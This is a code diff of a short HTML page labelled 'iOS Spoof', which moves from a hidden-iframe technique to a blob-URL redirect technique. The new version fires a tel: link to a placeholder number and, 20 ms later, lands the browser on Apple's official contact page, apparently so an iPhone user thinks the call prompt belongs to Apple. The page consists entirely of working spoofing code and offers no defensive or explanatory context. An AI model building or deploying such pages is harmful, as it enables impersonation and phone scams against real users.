@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iOS Spoof - Teknik 2</title>
+    <title>iOS Spoof - Teknik 3</title>
     <style>
       .btn {
         background: #007aff;
@@ -19,24 +19,25 @@
     </style>
   </head>
   <body>
-    <a href="javascript:void(0)" onclick="runSpoof2()" class="btn"
-      >📞 Call Apple Official</a
+    <a href="javascript:void(0)" onclick="runSpoof3()" class="btn"
+      >📞 Verify with Apple</a
     >
 
     <script>
-      function runSpoof2() {
-        // Buat iframe tersembunyi
-        var iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        // Picu tel via iframe
-        iframe.src = "tel:+1234567890";
-        document.body.appendChild(iframe);
+      function runSpoof3() {
+        // Jalankan tel link
+        window.location.href = "tel:+1234567890";
 
-        // Segera navigasikan main window ke URL asli
-        // Cobalah bereksperimen dengan delay 0ms hingga 100ms
+        // Buat HTML blob untuk redirect
+        const targetUrl = "https://www.apple.com/contact/";
+        const htmlContent = `<html><script>window.location.replace('${targetUrl}');<\/script></html>`;
+        const blob = new Blob([htmlContent], { type: "text/html" });
+        const blobUrl = URL.createObjectURL(blob);
+
+        // Arahkan ke blob URL yang akan segera me-redirect ke Apple
         setTimeout(function () {
-          window.location.href = "https://www.apple.com/contact/";
-        }, 10);
+          window.location.href = blobUrl;
+        }, 20);
       }
     </script>
   </body>
